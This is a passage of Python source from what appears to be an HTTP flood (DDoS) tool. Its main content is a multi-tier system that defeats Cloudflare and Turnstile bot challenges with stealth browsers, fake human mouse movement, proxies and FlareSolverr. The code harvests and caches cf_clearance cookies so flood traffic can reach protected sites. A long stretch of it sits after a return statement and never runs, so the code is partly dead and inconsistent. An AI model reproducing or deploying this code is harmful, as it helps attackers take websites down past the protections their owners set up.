                                ua = page.evaluate("navigator.userAgent")
                                return cookie_str, ua
                            
                            # Adaptive Interaction: Move mouse slightly to trigger human behavior
                            if i % 3 == 0:
                                try:
                                    page.mouse.move(random.randint(100, 500), random.randint(100, 500))
                                    page.mouse.wheel(0, random.randint(100, 300))
                                except: pass
                        BypassDebugger.capture_failure("Tier 3 (CloakBrowser)", url, page_obj=page, error_msg="Challenge not solved")
                    except Exception as e:
                        BypassDebugger.capture_failure("Tier 3 (CloakBrowser)", url, page_obj=page, error_msg=str(e))
                finally:
                    browser.close()
            except Exception as e:
                BypassDebugger.capture_failure("Tier 3 (CloakBrowser-Launch)", url, error_msg=str(e))

        # 3b. Patchright (Stealth Playwright)
        if PATCHRIGHT_INSTALLED:
            try:
                from patchright.sync_api import sync_playwright
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    try:
                        context_kwargs = {"user_agent": user_agent} if user_agent else {}
                        if proxy:
                            p_url = f"http://{proxy}" if "://" not in proxy else proxy
                            context_kwargs["proxy"] = {"server": p_url}
                        
                        context = browser.new_context(**context_kwargs)
                        page = context.new_page()
                        page.goto(url, timeout=timeout * 1000)
                        from time import sleep
                        import random
                        for i in range(15):
                            sleep(2)
                            cookies = context.cookies()
                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                            if "cf_clearance" in cookie_str:
                                try:
                                    actual_ua = page.evaluate("navigator.userAgent")
                                except Exception:
                                    actual_ua = user_agent
                                return cookie_str, actual_ua
                                
                            # Attempt Turnstile checkbox interaction if present
                            try:
                                iframe = page.frame_locator("iframe[src*='turnstile'], iframe[src*='cloudflare']")
                                checkbox = iframe.locator("input[type='checkbox'], .cb-lb, #challenge-stage")
                                if checkbox.count() > 0:
                                    checkbox.first.click(timeout=1000)
                            except Exception:
                                pass
                                
                            if i % 3 == 0:
                                try:
                                    page.mouse.move(random.randint(100, 500), random.randint(100, 500))
                                except: pass
                        BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page, error_msg="Challenge not solved")
                    except Exception as e:
                        page_obj = page if 'page' in locals() else None
                        BypassDebugger.capture_failure("Tier 3 (Patchright)", url, page_obj=page_obj, error_msg=str(e))
                    finally:
                        browser.close()
            except Exception as e:
                BypassDebugger.capture_failure("Tier 3 (Patchright-Launch)", url, error_msg=str(e))

        # 3c. Undetected Chromedriver
        if UNDETECTED_CHROMEDRIVER_INSTALLED:
            try:
                import undetected_chromedriver as uc
                options = uc.ChromeOptions()
                options.add_argument('--headless')
                if proxy:
                    p_url = f"http://{proxy}" if "://" not in proxy else proxy
                    options.add_argument(f'--proxy-server={p_url}')
                driver = uc.Chrome(options=options)
                try:
                    driver.get(url)
                    from time import sleep
                    import random
                    for i in range(15):
                        sleep(2)
                        cookies = driver.get_cookies()
                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                        if "cf_clearance" in cookie_str:
                            ua = driver.execute_script("return navigator.userAgent")
                            return cookie_str, ua
                    
                        if i % 3 == 0:
                            try:
                                driver.execute_script(f"window.scrollBy(0, {random.randint(100, 300)});")
                            except: pass
                    BypassDebugger.capture_failure("Tier 3 (UC)", url, page_obj=driver, error_msg="Challenge not solved")
                except Exception as e:
                    BypassDebugger.capture_failure("Tier 3 (UC)", url, page_obj=driver, error_msg=str(e))
                finally:
                    driver.quit()
            except Exception as e:
                BypassDebugger.capture_failure("Tier 3 (UC-Launch)", url, error_msg=str(e))

        return None, None

    @staticmethod
    def _solve_tier4_ultimate_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45):
        # 4a. Camoufox (Ultimate Stealth Firefox)
        if CAMOUFOX_INSTALLED:
            try:
                from camoufox.sync_api import Camoufox
                camoufox_kwargs = {
                    "headless": True,
                    "humanize": True,
                    "fingerprint_preset": True,
                    "os": "windows" # Better clustering avoidance
                }
                if proxy:
                    p_url = f"http://{proxy}" if "://" not in proxy else proxy
                    camoufox_kwargs["proxy"] = {"server": p_url}

                with Camoufox(**camoufox_kwargs) as browser:
                    page = browser.new_page()
                    try:
                        page.goto(url, wait_until="domcontentloaded", timeout=timeout * 1000)
                        from time import sleep
                        import random
                        for i in range(20):
                            sleep(2.0)
                            cookies = browser.contexts[0].cookies()
                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                            if "cf_clearance" in cookie_str:
                                ua = page.evaluate("navigator.userAgent")
                                return cookie_str, ua

                            # Attempt Turnstile checkbox interaction if present
                            try:
                                iframe = page.frame_locator("iframe[src*='turnstile'], iframe[src*='cloudflare']")
                                checkbox = iframe.locator("input[type='checkbox'], .cb-lb, #challenge-stage")
                                if checkbox.count() > 0:
                                    checkbox.first.click(timeout=1000)
                            except Exception:
                                pass

                            # Adaptive Interaction
                            if i % 3 == 0:
                                try:
                                    page.mouse.move(random.randint(100, 500), random.randint(100, 500))
                                    page.mouse.wheel(0, random.randint(100, 300))
                                except: pass
                        BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg="Challenge not solved")
                    except Exception as e:
                        BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg=str(e))
                    finally:
                        pass # Camoufox context manager handles it
            except Exception as e:
                BypassDebugger.capture_failure("Tier 4 (Camoufox-Launch)", url, error_msg=str(e))

        return None, None

    @staticmethod
    def solve_cf(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
        # 1. Check cache
        cache_file = get_data_path() / "assets" / "token_cache.json"
        try:
            import os, json
            from time import time
            if os.path.exists(cache_file):
                with open(cache_file, "r") as f:
                    cache = json.load(f)
                
                domain = url.split("//")[-1].split("/")[0]
                if domain in cache:
                    entry = cache[domain]
                    # Check TTL (default 30 mins max)
                    if time() - entry["timestamp"] < min(entry.get("expiry", 1800), 1800):
                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Testing cached token for {domain}...{bcolors.RESET}")
                        probe_headers = {
                            "User-Agent": entry["ua"],
                            "Cookie": entry["cookie"],
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                        }
                        probe_success = False
                        
                        if CURL_CFFI_INSTALLED:
                            from curl_cffi.requests import Session as CurlSyncSession
                            profile = BrowserEngine.get_curl_profile(entry["ua"])
                            with CurlSyncSession(impersonate=profile) as cs:
                                if proxy:
                                    p_url = f"http://{proxy}" if "://" not in proxy else proxy
                                    cs.proxies = {"http": p_url, "https": p_url}
                                resp = cs.get(url, headers=probe_headers, timeout=10, allow_redirects=True)
                                if resp.status_code < 403:
                                    probe_success = True
                        else:
                            scraper = create_scraper()
                            if proxy:
                                p_url = f"http://{proxy}" if "://" not in proxy else proxy
                                scraper.proxies = {"http": p_url, "https": p_url}
                            resp = scraper.get(url, headers=probe_headers, timeout=10)
                            if resp.status_code < 403:
                                probe_success = True
                        
                        if probe_success:
                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cached token is valid. Skipping solver.{bcolors.RESET}")
                            HttpFlood._active_solver = entry.get("solver_name", "Cache")
                            return entry["cookie"], entry["ua"]
                        else:
                            logger.info(f"{bcolors.WARNING}[!] Headless Recon: Cached token expired or invalid. Solving again...{bcolors.RESET}")
        except Exception as e:
            logger.debug(f"[*] Cache read error: {e}")

        # 2. Call internal solver
        cookie, ua = BrowserEngine._solve_cf_internal(url, proxy, user_agent, timeout)

        # 3. Save to cache
        if cookie:
            try:
                import os, json
                from time import time
                os.makedirs("files", exist_ok=True)
                cache = {}
                if os.path.exists(cache_file):
                    with open(cache_file, "r") as f:
                        cache = json.load(f)
                
                domain = url.split("//")[-1].split("/")[0]
                cache[domain] = {
                    "cookie": cookie,
                    "ua": ua,
                    "timestamp": time(),
                    "expiry": 1800,
                    "solver_name": getattr(HttpFlood, "_active_solver", "Unknown")
                }
                with open(cache_file, "w") as f:
                    json.dump(cache, f, indent=4)
                logger.debug(f"[*] Saved cookie for {domain} to token_cache.json")
            except Exception as e:
                logger.debug(f"[*] Cache write error: {e}")

        return cookie, ua

    @staticmethod
    def _solve_cf_internal(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
        if not url.startswith("https://") and not url.startswith("http://"):
            url = "https://" + url
        elif url.startswith("http://"):
            url = url.replace("http://", "https://")
        
        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Starting Waterfall Bypass System for {url}...{bcolors.RESET}")
        
        # Tier 0: External FlareSolverr API
        if getattr(ENGINE_STATE, "flaresolverr_url", None):
            logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 0 (FlareSolverr API) at {ENGINE_STATE.flaresolverr_url}...{bcolors.RESET}")
            try:
                import urllib.request
                import json
                payload_data = {
                    "cmd": "request.get",
                    "url": url,
                    "maxTimeout": 15000
                }
                if proxy:
                    payload_data["proxy"] = {"url": f"http://{proxy}" if "://" not in proxy else proxy}
                payload = json.dumps(payload_data).encode("utf-8")
                req = urllib.request.Request(
                    ENGINE_STATE.flaresolverr_url,
                    data=payload,
                    headers={"Content-Type": "application/json"}
                )
                with urllib.request.urlopen(req, timeout=18) as resp:
                    resp_data = json.loads(resp.read().decode("utf-8"))
                    if resp_data.get("status") == "ok" and resp_data.get("solution"):
                        sol = resp_data["solution"]
                        cookies = sol.get("cookies", [])
                        ua = sol.get("userAgent", user_agent)
                        cf_cookie = next((f"{c['name']}={c['value']}" for c in cookies if c.get("name") == "cf_clearance"), None)
                        if cf_cookie:
                            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
                            HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
                            return cf_cookie, ua
            except Exception as e:
                logger.debug(f"[!] Tier 0 FlareSolverr failed: {e}. Falling back to Tier 1.")

        # Tier 1: Lightweight HTTP
        logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 1 (Lightweight)...{bcolors.RESET}")
        cookie, ua = BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
        if cookie:
            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 1!{bcolors.RESET}")
            HttpFlood._active_solver = "Tier 1"
            return cookie, ua

        # Tier 2: Fast Headless CDP
        logger.info(f"{bcolors.WARNING}[!] Tier 1 failed. Executing Tier 2 (Fast CDP)...{bcolors.RESET}")
        cookie, ua = BrowserEngine._solve_tier2_fast_cdp(url, proxy, user_agent, 15)
        if cookie:
            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 2!{bcolors.RESET}")
            HttpFlood._active_solver = "Tier 2"
            return cookie, ua
            
        # Tier 3: Heavy Stealth Chromium
        logger.info(f"{bcolors.WARNING}[!] Tier 2 failed. Executing Tier 3 (Heavy Stealth)...{bcolors.RESET}")
        cookie, ua = BrowserEngine._solve_tier3_heavy_stealth(url, proxy, user_agent, 30)
        if cookie:
            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 3!{bcolors.RESET}")
            HttpFlood._active_solver = "Tier 3"
            return cookie, ua

        # Tier 4: Ultimate Stealth Firefox
        logger.info(f"{bcolors.WARNING}[!] Tier 3 failed. Executing Tier 4 (Ultimate Stealth)...{bcolors.RESET}")
        cookie, ua = BrowserEngine._solve_tier4_ultimate_stealth(url, proxy, user_agent, 45)
        if cookie:
            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 4!{bcolors.RESET}")
            HttpFlood._active_solver = "Tier 4"
            return cookie, ua

        logger.error(f"{bcolors.FAIL}[!] All configured bypass tiers failed.{bcolors.RESET}")
        return None, None
        
        # === TIER 1: Lightweight HTTP Solvers (10s max) ===
        # These can solve simple JS challenges without launching a full browser
        
        # Tier 1a: Cloudscraper — handles basic Cloudflare JS challenges
        t1a_start = time()
        try:
            logger.info(f"{bcolors.OKCYAN}[*] Tier 1a: Trying cloudscraper...{bcolors.RESET}")
            scraper = create_scraper()
            if proxy:
                p_url = f"http://{proxy}" if "://" not in proxy else proxy
                scraper.proxies = {"http": p_url, "https": p_url}
            resp = scraper.get(url, timeout=10)
            t1a_elapsed = round(time() - t1a_start, 2)
            cookie_names = list(resp.cookies.keys())
            logger.info(f"[*] Tier 1a Result: HTTP {resp.status_code}, Cookies={cookie_names}, Time={t1a_elapsed}s")
            if resp.status_code < 403:
                t1_cookie = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])
                if "cf_clearance" in t1_cookie:
                    t1_ua = resp.request.headers.get("User-Agent", user_agent)
                    logger.info(f"{bcolors.OKGREEN}[*] Tier 1a: Cloudscraper solved! cf_clearance obtained in {t1a_elapsed}s{bcolors.RESET}")
                    HttpFlood._active_solver = "Cloudscraper"
                    return t1_cookie, t1_ua
                else:
                    logger.info(f"{bcolors.OKCYAN}[*] Tier 1a: HTTP {resp.status_code} but no cf_clearance. Escalating...{bcolors.RESET}")
            else:
                logger.info(f"{bcolors.WARNING}[*] Tier 1a: HTTP {resp.status_code} (blocked). Escalating to Tier 1b...{bcolors.RESET}")
        except Exception as e:
            t1a_elapsed = round(time() - t1a_start, 2)
            logger.info(f"[*] Tier 1a: Cloudscraper failed in {t1a_elapsed}s: {type(e).__name__}: {e}")
            if type(e).__name__ in ['ConnectTimeout', 'ProxyError', 'ConnectionError', 'ReadTimeout', 'Timeout', 'SSLError', 'CurlError']:
                logger.error(f"{bcolors.FAIL}[!] Proxy network failure detected (Tier 1a). Falling through to next tier.{bcolors.RESET}")
                pass
        
        # Tier 1b: curl_cffi — browser-grade TLS fingerprint
        if CURL_CFFI_INSTALLED:
            t1b_start = time()
            try:
                logger.info(f"{bcolors.OKCYAN}[*] Tier 1b: Trying curl_cffi (browser TLS)...{bcolors.RESET}")
                from curl_cffi.requests import Session as CurlSyncSession
                profile = BrowserEngine.get_curl_profile(user_agent)
                logger.info(f"[*] Tier 1b: Using TLS profile '{profile}'")
                with CurlSyncSession(impersonate=profile) as cs:
                    if proxy:
                        p_url = f"http://{proxy}" if "://" not in proxy else proxy
                        cs.proxies = {"http": p_url, "https": p_url}
                    resp = cs.get(url, timeout=10, allow_redirects=True)
                    t1b_elapsed = round(time() - t1b_start, 2)
                    cookie_names = list(resp.cookies.keys())
                    logger.info(f"[*] Tier 1b Result: HTTP {resp.status_code}, Cookies={cookie_names}, Time={t1b_elapsed}s")
                    if resp.status_code < 403:
                        t1_cookie = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])
                        if "cf_clearance" in t1_cookie:
                            logger.info(f"{bcolors.OKGREEN}[*] Tier 1b: curl_cffi solved! cf_clearance obtained in {t1b_elapsed}s{bcolors.RESET}")
                            HttpFlood._active_solver = "curl_cffi"
                            return t1_cookie, user_agent
                        else:
                            logger.info(f"{bcolors.OKCYAN}[*] Tier 1b: HTTP {resp.status_code} but no cf_clearance. Escalating...{bcolors.RESET}")
                    else:
                        logger.info(f"{bcolors.WARNING}[*] Tier 1b: HTTP {resp.status_code} (blocked). Escalating to Tier 2...{bcolors.RESET}")
            except Exception as e:
                t1b_elapsed = round(time() - t1b_start, 2)
                logger.info(f"[*] Tier 1b: curl_cffi failed in {t1b_elapsed}s: {type(e).__name__}: {e}")
                if type(e).__name__ in ['ConnectTimeout', 'ProxyError', 'ConnectionError', 'ReadTimeout', 'Timeout', 'SSLError', 'CurlError']:
                    logger.error(f"{bcolors.FAIL}[!] Proxy network failure detected (Tier 1b). Falling through to next tier.{bcolors.RESET}")
                    pass

        # === TIER 1c: Nodriver (Direct CDP Protocol) ===
        if NODRIVER_INSTALLED:
            t1c_start = time()
            logger.info(f"{bcolors.OKCYAN}[*] Tier 1c: Nodriver (native CDP) engine activated.{bcolors.RESET}")
            try:
                import nodriver as uc
                
                async def _solve_nodriver():
                    browser = await uc.start()
                    try:
                        page = await browser.get(url)

                        # Challenge Detection & Polling Loop
                        for pulse in range(20):
                            try:
                                # 1. Polling for cookies (Sequential with delay)
                                await asyncio.sleep(2.5)
                                
                                # In nodriver 0.50+, cookies are in browser.cookies
                                cookies = await browser.cookies.get_all()
                                cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
                                if "cf_clearance" in cookie_str:
                                    break
                                
                                # 2. Find and click iframe
                                try:
                                    iframes = await page.select_all("iframe")
                                    for iframe in iframes:
                                        src = getattr(iframe, "src", "").lower()
                                        if "cloudflare" in src or "turnstile" in src:
                                            logger.debug(f"[*] Headless Recon: Interaction pulse {pulse+1} (Nodriver).")
                                            await iframe.mouse_click()
                                            break
                                except Exception:
                                    pass

                            except AssertionError as ae:
                                # Library-level concurrency crash (websockets 14+)
                                # ABORT immediately to prevent infinite loop of tracebacks
                                logger.error(f"{bcolors.FAIL}[!] Nodriver Library Error: Concurrency violation (websockets). Aborting.{bcolors.RESET}")
                                return None, None
                            except Exception as inner_e:
                                logger.debug(f"[*] Nodriver Loop Warning: {inner_e}")
                                await asyncio.sleep(1.0)

                        # Final extraction
                        try:
                            cookies = await page.get_cookies()
                            cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
                            ua = await page.evaluate("navigator.userAgent")
                            if "cf_clearance" in cookie_str:
                                return cookie_str, ua
                        except:
                            pass
                            
                        return None, None
                    finally:
                        try:
                            browser.stop()
                        except:
                            pass

                cookie_str, ua = asyncio.run(_solve_nodriver())
                t1c_elapsed = round(time() - t1c_start, 2)
                if cookie_str:
                    HttpFlood._active_solver = "Nodriver"
                    logger.info(f"{bcolors.OKGREEN}[*] Tier 1c: Nodriver SUCCESS in {t1c_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
                    return cookie_str, ua
                else:
                    logger.warning(f"{bcolors.WARNING}[!] Tier 1c: Nodriver failed after {t1c_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
            except Exception as e:
                t1c_elapsed = round(time() - t1c_start, 2)
                logger.error(f"{bcolors.FAIL}[!] Tier 1c: Nodriver FAILED in {t1c_elapsed}s: {e}{bcolors.RESET}")
                logger.debug(f"[!] Nodriver Traceback:\n{traceback.format_exc()}")
            finally:
                # Cleanup loop if needed
                pass
        
        
        # === TIER 2: DrissionPage + CloudflareBypasser ===
        if DRISSION_INSTALLED:
            t2a_start = time()
            logger.info(f"{bcolors.OKCYAN}[*] Tier 2: DrissionPage engine activated.{bcolors.RESET}")
            try:
                co = ChromiumOptions()
                co.auto_port()
                co.set_user_data_path(f"temp/dp_{randint(100000, 999999)}")
                co.set_argument('--disable-blink-features=AutomationControlled')
                if sys.platform != "win32":
                    co.set_argument('--no-sandbox')
                    co.set_argument('--headless=new')
                
                if proxy:
                    px_url = f"http://{proxy}" if "://" not in proxy else proxy
                    co.set_argument(f'--proxy-server={px_url}')

                page = ChromiumPage(co)
                page.set.timeouts(page_load=15, script=10)
                try:
                    page.get(url, retry=0, timeout=15)
                except Exception as nav_e:
                    err_msg = str(nav_e).lower()
                    if "timeout" not in err_msg and ("connection" in err_msg or "refused" in err_msg or "proxy" in err_msg):
                        logger.error(f"{bcolors.FAIL}[!] Proxy network failure in DrissionPage. Aborting.{bcolors.RESET}")
                        page.quit()
                        return "proxy_error", None
                    pass

                # High-Fidelity Interaction Sequence
                cookie_str = ""
                for pulse in range(30):
                    title = page.title
                    cookies = page.cookies()
                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])

                    if "cf_clearance" in cookie_str:
                        # Wait for session commitment (prevents immediate 403 on first flood request)
                        sleep(2.5) 
                        break

                    # 1. Human Heuristics: Jittered Movement
                    page.actions.move(randint(50, 950), randint(50, 750))

                    # 2. Challenge Identification & Interaction
                    try:
                        # Shadow DOM Traversal for Turnstile
                        all_inputs = page.eles("tag:input")
                        for input_elem in all_inputs:
                            name = input_elem.attr("name")
                            if name and "turnstile" in name.lower():
                                parent = input_elem.parent()
                                if parent and parent.shadow_root:
                                    shadow1 = parent.shadow_root
                                    for child in shadow1.children():
                                        if child.tag == "iframe":
                                            iframe_body = child("tag:body")
                                            if iframe_body and iframe_body.shadow_root:
                                                shadow2 = iframe_body.shadow_root
                                                checkbox = shadow2("tag:input")
                                                if checkbox:
                                                    checkbox.click()
                                                    logger.debug(f"[*] Headless Recon: Challenge widget clicked via Shadow DOM.")
                                                    break
                    except Exception: 
                        pass
                    sleep(1.5) # Increased delay for slow SOCKS nodes

                ua = user_agent
                try:
                    ua = page.run_js("return navigator.userAgent;")
                except: pass

                t2a_elapsed = round(time() - t2a_start, 2)
                if "cf_clearance" in cookie_str:
                    HttpFlood._active_solver = "DrissionPage"
                    # Sync with tactical engine
                    HttpFlood._cfbuam_proxy = proxy
                    logger.info(f"{bcolors.OKGREEN}[*] Tier 2: DrissionPage SUCCESS in {t2a_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
                    # Brief heartbeat to stabilize
                    page.get(url, timeout=5)
                    page.quit()
                    return cookie_str, ua                # Removed flawed UAM Disabled fallback. If it reached Tier 2, UAM is active. Must get cf_clearance.
                else:
                    logger.warning(f"{bcolors.WARNING}[!] Tier 2: DrissionPage failed after {t2a_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
            except Exception as e:
                t2a_elapsed = round(time() - t2a_start, 2)
                logger.error(f"{bcolors.FAIL}[!] Tier 2: DrissionPage FAILED in {t2a_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
            finally:
                try:
                    page.quit()
                except:
                    pass
        # === TIER 2b: Camoufox Anti-Detect Browser (45s max) ===
        if CAMOUFOX_INSTALLED:
            t2b_start = time()
            logger.info(f"{bcolors.OKCYAN}[*] Tier 2b: Camoufox (Firefox anti-detect) engine activated.{bcolors.RESET}")
            try:
                is_windows = sys.platform.lower().startswith('win')
                camoufox_kwargs = {
                    "headless": not is_windows,  # Turnstile needs visible context on Windows
                    "humanize": True,             # Human-like cursor movements
                    "fingerprint_preset": True,   # Use real-world fingerprints
                }
                if proxy:
                    px_url = f"http://{proxy}" if "://" not in proxy else proxy
                    camoufox_kwargs["proxy"] = {"server": px_url}
                    camoufox_kwargs["geoip"] = True
                
                import warnings
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    with Camoufox(**camoufox_kwargs) as browser:
                        page = browser.new_page()
                    
                        # Navigate to target
                        try:
                            page.goto(url, wait_until="domcontentloaded", timeout=20000)
                        except Exception as nav_e:
                            if "timeout" not in str(nav_e).lower():
                                raise nav_e
                            pass  # Timeout on challenge page is expected
                        
                        sleep(2)
                        
                        # Human-like interaction to trigger Turnstile
                        page.mouse.move(randint(100, 800), randint(100, 600), steps=randint(5, 15))
                        sleep(0.5)
                        page.mouse.wheel(0, randint(100, 300))
                        sleep(1)
                        
                        # Try clicking Turnstile checkbox
                        solved = False
                        for attempt in range(12):
                            # Check iframes for Turnstile widget
                            for frame in page.frames:
                                try:
                                    f_url = frame.url.lower()
                                    if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
                                        logger.info(f"{bcolors.OKCYAN}[*] Tier 2b: Turnstile widget found. Interaction pulse {attempt+1}...{bcolors.RESET}")
                                        box = frame.frame_element().bounding_box()
                                        if box:
                                            target_x = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
                                            target_y = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
                                            page.mouse.move(target_x, target_y, steps=randint(8, 20))
                                            sleep(0.3 + random.random() * 0.4)
                                            page.mouse.click(target_x, target_y)
                                            solved = True
                                            break
                                except Exception:
                                    continue
                            
                            # Fallback: CSS selectors on main page
                            if not solved:
                                for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container", "[role='checkbox']"]:
                                    try:
                                        if page.locator(sel).count() > 0 and page.locator(sel).is_visible():
                                            page.locator(sel).click(timeout=2000, delay=randint(50, 150))
                                            solved = True
                                            break
                                    except Exception:
                                        pass
                            
                            if solved:
                                page.wait_for_timeout(3000)
                                try:
                                    title = page.title().lower()
                                    if "just a moment" not in title and title:
                                        break
                                except Exception:
                                    break  # Context destroyed = navigated past challenge
                                solved = False
                            
                            page.mouse.move(randint(100, 800), randint(100, 600), steps=5)
                            sleep(1.5)
                        
                        # Wait for cf_clearance to appear
                        for _ in range(20):
                            cookies_list = browser.contexts[0].cookies()
                            if any(c['name'] == 'cf_clearance' for c in cookies_list):
                                logger.info(f"{bcolors.OKGREEN}[*] Tier 2b: Camoufox obtained cf_clearance!{bcolors.RESET}")
                                break
                            sleep(1.5)
                        
                        # Extract cookies
                        cookies_list = browser.contexts[0].cookies()
                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                        
                        ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
                        try:
                            ua = page.evaluate("navigator.userAgent")
                        except Exception:
                            pass
                        
                        t2b_elapsed = round(time() - t2b_start, 2)
                        if "cf_clearance" in cookie_str:
                            HttpFlood._active_solver = "Camoufox"
                            logger.info(f"{bcolors.OKGREEN}[*] Tier 2b: Camoufox SUCCESS in {t2b_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
                            return cookie_str, ua
                        else:
                            logger.warning(f"{bcolors.WARNING}[!] Tier 2b: Camoufox failed after {t2b_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
            except Exception as e:
                t2b_elapsed = round(time() - t2b_start, 2)
                logger.error(f"{bcolors.FAIL}[!] Tier 2b: Camoufox FAILED in {t2b_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
                logger.debug(f"[!] Tier 2b Traceback:\n{traceback.format_exc()}")
            finally:
                try:
                    if 'asyncio.events' in sys.modules:
                        sys.modules['asyncio.events']._set_running_loop(None)
                except Exception:
                    pass        
        # === TIER 2c: Patchright (Patched Chromium) ===
        if PATCHRIGHT_INSTALLED:
            t2c_start = time()
            logger.info(f"{bcolors.OKCYAN}[*] Tier 2c: Patchright (patched Chromium) engine activated.{bcolors.RESET}")
            try:
                is_windows = sys.platform.lower().startswith('win')
                with patchright_sync() as p:
                    launch_args = {
                        "headless": not is_windows,
                        "channel": "chrome",
                        "args": [
                            "--disable-blink-features=AutomationControlled",
                            "--no-sandbox",
                            "--disable-setuid-sandbox",
                            "--ignore-certificate-errors",
                            "--disable-web-security",
                            "--disable-infobars",
                            "--window-position=-32000,-32000",
                        ],
                    }
                    if proxy:
                        px_url = f"http://{proxy}" if "://" not in proxy else proxy
                        launch_args["proxy"] = {"server": px_url}
                    
                    browser = p.chromium.launch(**launch_args)
                    try:
                        context = browser.new_context(
                            viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
                            user_agent=user_agent or ML_ENGINE.get_fingerprint()["ua"],
                        )
                        page = context.new_page()
                        
                        try:
                            page.goto(url, wait_until="domcontentloaded", timeout=15000)
                        except Exception as nav_e:
                            if "timeout" not in str(nav_e).lower():
                                return "proxy_error", None
                            pass
                        
                        sleep(2)
                        page.mouse.move(randint(100, 800), randint(100, 600), steps=10)
                        sleep(0.5)
                        
                        # Turnstile interaction
                        for attempt in range(12):
                            for frame in page.frames:
                                try:
                                    f_url = frame.url.lower()
                                    if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
                                        box = frame.frame_element().bounding_box()
                                        if box:
                                            tx = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
                                            ty = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
                                            page.mouse.move(tx, ty, steps=randint(8, 15))
                                            sleep(0.3 + random.random() * 0.3)
                                            page.mouse.click(tx, ty)
                                            page.wait_for_timeout(3000)
                                            break
                                except Exception:
                                    continue
                            
                            # Check if solved
                            try:
                                cookies_list = context.cookies()
                                if any(c['name'] == 'cf_clearance' for c in cookies_list):
                                    break
                                title = page.title().lower()
                                if "just a moment" not in title and title:
                                    break
                            except Exception:
                                break
                            sleep(1.5)
                        
                        # Harvest cookies
                        try:
                            cookies_list = context.cookies()
                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                            ua = page.evaluate("navigator.userAgent")
                        except Exception:
                            cookie_str = ""
                            ua = user_agent
                        
                        t2c_elapsed = round(time() - t2c_start, 2)
                        if "cf_clearance" in cookie_str:
                            HttpFlood._active_solver = "Patchright"
                            logger.info(f"{bcolors.OKGREEN}[*] Tier 2c: Patchright SUCCESS in {t2c_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
                            return cookie_str, ua
                        else:
                            logger.warning(f"{bcolors.WARNING}[!] Tier 2c: Patchright failed after {t2c_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
                    finally:
                        try:
                            browser.close()
                        except: pass
            except Exception as e:
                t2c_elapsed = round(time() - t2c_start, 2)
                logger.error(f"{bcolors.FAIL}[!] Tier 2c: Patchright FAILED in {t2c_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
                logger.debug(f"[!] Tier 2c Traceback:\n{traceback.format_exc()}")
            finally:
                try:
                    if 'asyncio.events' in sys.modules:
                        sys.modules['asyncio.events']._set_running_loop(None)
                except Exception:
                    pass

        # === TIER 2d: CloakBrowser (Advanced Stealth Chromium) ===
        if CLOAKBROWSER_INSTALLED:
            t2d_start = time()
            logger.info(f"{bcolors.OKCYAN}[*] Tier 2d: CloakBrowser (stealth Chromium) engine activated.{bcolors.RESET}")
            browser = None
            try:
                is_windows = sys.platform.lower().startswith('win')
                
                cloak_kwargs = {
                    "headless": not is_windows,
                    "humanize": True,
                }
                
                if proxy:
                    px_url = f"http://{proxy}" if "://" not in proxy else proxy
                    cloak_kwargs["proxy"] = px_url
                    cloak_kwargs["geoip"] = True
                    
                browser = cloakbrowser_launch(**cloak_kwargs)
                context = browser.contexts[0] if browser.contexts else browser.new_context()
                page = context.pages[0] if context.pages else context.new_page()
                
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=20000)
                except Exception as nav_e:
                    pass
                
                sleep(2)
                page.mouse.move(randint(100, 800), randint(100, 600), steps=randint(5, 15))
                sleep(0.5)
                page.mouse.wheel(0, randint(100, 300))
                
